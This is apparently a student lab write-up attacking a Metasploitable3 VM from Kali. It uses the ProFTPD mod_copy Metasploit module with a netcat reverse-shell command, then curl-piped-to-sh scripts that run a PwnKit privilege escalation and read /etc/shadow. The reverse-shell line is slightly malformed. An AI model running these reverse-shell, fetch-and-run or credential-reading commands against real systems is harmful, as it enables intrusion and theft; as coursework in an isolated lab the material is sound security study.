📚 Phase 1: Setup, Service Compromise, and Custom Exploitation
🛠️ 1. Environment Setup
1.1 Import Victim VM (Metasploitable3)
Download .ova file from SourceForge Metasploitable3 Repository.

Open VirtualBox → File → Import Appliance.

Select .ova file and customize VM settings (RAM = 2048MB, CPU = 2).

Import completed successfully.

Screenshots:











1.2 Boot the Victim VM
Start the imported VM.

Login credentials:

Username: vagrant

Password: vagrant

Screenshot:



1.3 Obtain Victim IP Address
Inside Metasploitable3, run:

bash
Copy
Edit
ifconfig
Obtained IP address: 10.0.2.15

Screenshots:





1.4 Confirm Network Connectivity
From Kali (attacker machine):

bash
Copy
Edit
ping 10.0.2.15
Ping successful — confirming internal network connection (NAT Network).

Screenshot:



💣 2. TASK 1.1: Compromise Service Using Metasploit
2.1 Scan Victim with Nmap
In Kali VM:

bash
Copy
Edit
nmap -sV 10.0.2.15
Discovered open services: FTP (ProFTPD 1.3.5) on port 21.

Screenshot:


📝 GitHub Comment:
"Scanned victim machine to discover services. FTP ProFTPD 1.3.5 detected on port 21, vulnerable to known exploits."

2.2 Start Metasploit Console
In Kali VM:

bash
Copy
Edit
sudo msfconsole
Screenshot:


📝 GitHub Comment:
"Launched Metasploit Framework for exploitation."

2.3 Search for FTP Exploit (mod_copy)
Inside Metasploit:

bash
Copy
Edit
search mod_copy
Found exploit: exploit/unix/ftp/proftpd_modcopy_exec.

Select it using:

bash
Copy
Edit
use 0
Screenshot:


📝 GitHub Comment:
"Selected proftpd_modcopy_exec exploit module targeting ProFTPD service."

2.4 Configure Exploit Options
Set target IP and writable site path:

bash
Copy
Edit
set RHOSTS 10.0.2.15
set SITEPATH /var/www/html
Screenshot:


📝 GitHub Comment:
"Set victim IP and writable FTP path for payload delivery."

2.5 Set Payload and Command
Set the payload and reverse shell command:

bash
Copy
Edit
set payload cmd/unix/generic
set LHOST 10.0.2.6
set LPORT 4444
set CMD /tmp/mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.2.6 4444 > /tmp/f
Screenshot:


📝 GitHub Comment:
"Configured generic Unix reverse shell payload connecting back to attacker's Netcat listener."

2.6 Start Netcat Listener (Terminal A)
In a new Kali terminal:

bash
Copy
Edit
nc -lnvp 4444
Screenshot:


📝 GitHub Comment:
"Started Netcat listener on attacker's machine awaiting shell connection."

2.7 Launch Exploit (Terminal B)
In Metasploit terminal:

bash
Copy
Edit
run
Screenshot:


📝 GitHub Comment:
"Triggered the exploit. Payload sent successfully. Awaiting reverse shell connection."

2.8 Confirm Reverse Shell Access
Once the session is received, confirm shell access:

bash
Copy
Edit
whoami
ls
Screenshot:


📝 GitHub Comment:
"Reverse shell session established. Accessed victim as www-data user."

🛠️ 3. TASK 1.2: Custom Exploitation and Privilege Escalation
3.1 Enumerate System with Custom LinPEAS Script
Inside the shell session:

bash
Copy
Edit
curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/lightpeas.sh | sh
Screenshot:


📝 GitHub Comment:
"Executed custom lightpeas.sh script to enumerate victim system for privilege escalation opportunities."

3.2 Exploit Privilege Escalation with Custom Exploit
Inside the shell session:

bash
Copy
Edit
sh -c "$(curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/escalate.sh)"
The script:

Downloads ExploitRoot.c.

Compiles it.

Executes the privilege escalation.

Screenshot:


📝 GitHub Comment:
"Ran custom escalate.sh automation script. Downloaded, compiled, and executed ExploitRoot.c to escalate privileges."

3.3 Confirm Root Access
After successful exploitation:

bash
Copy
Edit
whoami
cat /etc/shadow
Screenshot:


📝 GitHub Comment:
"Privilege escalation successful. Gained root access and retrieved contents of /etc/shadow."

📦 Custom Scripts Used

File	Description
lightpeas.sh	Custom enumeration tool based on LinPEAS
ExploitRoot.c	C-based custom exploit based on PwnKit (CVE-2021-4034)
escalate.sh	Shell automation script that downloads, compiles, and runs ExploitRoot.c
✅ All scripts are located inside:
phase1/custom/
